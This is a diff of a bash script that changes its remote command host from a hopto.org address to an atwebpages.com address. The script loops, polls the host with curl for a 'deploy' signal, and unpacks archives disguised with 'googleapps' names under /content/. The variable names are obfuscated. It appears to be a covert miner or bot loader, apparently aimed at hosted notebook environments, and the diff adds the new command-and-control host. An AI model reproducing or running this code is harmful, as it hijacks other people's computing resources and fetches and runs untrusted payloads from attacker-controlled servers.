@@ -3,7 +3,7 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 while true
 do
 
-string=$(curl -s http://mobile84121274.hopto.org/?q=deploy)
+string=$(curl -s http://linuxdistro8474.atwebpages.com/?q=deploy)
 if [[ $string == *"16384"* ]]; then
 
 cd /content/
@@ -13,7 +13,7 @@ tar -xf ./googleapps8474127412742.tar.gz
 
 cd googleapps8474
 
-arr[0]="http://mobile84121274.hopto.org/"
+arr[0]="http://linuxdistro8474.atwebpages.com/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -89,7 +89,7 @@ tar -xf ./linux84741274.tar.gz
 
 cd googleapps8474
 
-arr[0]="http://mobile84121274.hopto.org/"
+arr[0]="http://linuxdistro8474.atwebpages.com/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
